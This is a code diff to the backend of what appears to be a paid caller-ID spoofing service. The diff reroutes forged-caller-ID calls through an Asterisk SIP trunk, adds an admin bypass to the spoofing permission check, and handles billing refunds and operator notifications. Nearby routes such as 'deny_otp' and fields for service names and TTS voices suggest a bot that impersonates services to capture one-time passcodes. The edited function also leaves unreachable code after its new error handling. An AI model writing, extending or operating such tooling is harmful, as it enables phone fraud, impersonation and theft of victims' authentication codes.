@@ -353,10 +353,10 @@ async def deny_otp(call_id: str, current_user: dict = Depends(verify_token)):
 
 @router.post("/spoof/start")
 async def start_spoofed_call(call_data: SpoofCallCreate, current_user: dict = Depends(verify_token)):
-    """Initiate a spoofed call via SIP Direct (External SIP client will fetch params)"""
+    """Initiate a spoofed call via Asterisk SIP Trunk"""
     try:
-        # CHECK SPOOFING PERMISSION
-        if not current_user.get('can_use_spoofing', False):
+        # CHECK SPOOFING PERMISSION (Admin bypass)
+        if current_user['role'] != 'admin' and not current_user.get('can_use_spoofing', False):
             raise HTTPException(
                 status_code=403, 
                 detail="Access denied. You don't have permission to use spoofing feature. Contact admin."
@@ -403,7 +403,7 @@ async def start_spoofed_call(call_data: SpoofCallCreate, current_user: dict = De
             'recipient_name': call_data.recipient_name,
             'service_name': call_data.service_name,
             'call_type': 'spoof',
-            'provider': 'sip_direct',
+            'provider': 'asterisk_sip',
             'status': 'pending',
             'tts_voice': call_data.tts_voice,
             'language': call_data.language,
@@ -417,37 +417,67 @@ async def start_spoofed_call(call_data: SpoofCallCreate, current_user: dict = De
             'cost_per_minute': cost_per_minute,
             'minutes_charged': 1,  # Already charged 1st minute
             'charged_amount': first_minute_cost,  # Running total
-            'billing_status': 'partial_charged',  # Will be finalized on call end
-            'sip_domain': os.getenv('INFOBIP_SIP_DOMAIN', '81.23.254.103'),
-            'sip_port': int(os.getenv('INFOBIP_SIP_PORT', '5061'))
+            'billing_status': 'partial_charged'  # Will be finalized on call end
         }
         
         call_log = await MongoDBService.create_call_log(call_log)
         call_id = call_log['call_id']
         active_calls[call_id] = call_log
         
-        logger.info(f"SIP Spoofed call created: {call_id}")
-        logger.info(f"Spoofed: {call_data.spoofed_caller_id} ({call_data.from_display_name}) -> {call_data.to_number}")
+        logger.info(f"📞 SIP Spoofed call created: {call_id}")
+        logger.info(f"   Spoofed: {call_data.spoofed_caller_id} -> {call_data.to_number}")
         
-        # Auto-trigger external SIP client via ngrok webhook
+        # Initiate call via Asterisk on VPS
+        from services.asterisk_service import AsteriskService
+        asterisk = AsteriskService()
+        
         try:
-            external_webhook = "https://piddly-tenable-frederic.ngrok-free.dev/sip-trigger.php"
-            trigger_url = f"{external_webhook}?call_id={call_id}"
+            success = await asterisk.make_spoofed_call(
+                target_number=call_data.to_number,
+                spoofed_caller_id=call_data.spoofed_caller_id,
+                call_id=call_id
+            )
             
-            import httpx
-            async with httpx.AsyncClient(timeout=5.0) as client:
-                response = await client.get(trigger_url)
-                if response.status_code == 200:
-                    logger.info(f"External SIP client triggered successfully for {call_id}")
-                    # Update call status in MongoDB
-                    await MongoDBService.update_call_status(call_id, 'initiated')
-                else:
-                    logger.warning(f"Failed to trigger external SIP client: {response.status_code}")
+            if success:
+                logger.info(f"✅ Asterisk call file created successfully")
+                await MongoDBService.update_call_status(call_id, 'initiated')
+                
+                # Send event via WebSocket
+                event = {
+                    'time': datetime.utcnow().isoformat(),
+                    'event': 'spoofed_call_initiated',
+                    'message': f'📱 Spoofed call initiated to {call_data.to_number}',
+                    'data': {'call_id': call_id, 'spoofed_id': call_data.spoofed_caller_id}
+                }
+                
+                await MongoDBService.update_call_events(call_id, event)
+                await manager.send_to_user(current_user['uid'], {
+                    'type': 'call_event',
+                    'call_id': call_id,
+                    'event': event
+                })
+                
+                return {
+                    "success": True,
+                    "call_id": call_id,
+                    "message": "Spoofed call initiated via Asterisk",
+                    "spoofed_caller_id": call_data.spoofed_caller_id,
+                    "target_number": call_data.to_number
+                }
+            else:
+                raise Exception("Failed to create Asterisk call file")
+                
         except Exception as e:
-            logger.error(f"Error triggering external SIP client: {e}")
-            logger.info(f"Manual trigger: GET /api/calls/sip/{call_id}/params")
+            logger.error(f"❌ Asterisk call failed: {e}")
+            # Refund balance if call failed to initiate
+            await MongoDBService.update_user_balance(current_user['uid'], current_user['balance'] + first_minute_cost)
+            raise HTTPException(status_code=500, detail=f"Failed to initiate spoofed call: {str(e)}")
         
-        # Return proper CallResponse format
+    except HTTPException:
+        raise
+    except Exception as e:
+        logger.error(f"Error in start_spoofed_call: {e}")
+        raise HTTPException(status_code=500, detail="Failed to start spoofed call")
         return {
             "success": True,
             "message": "Spoofed call initiated. Check your phone!",
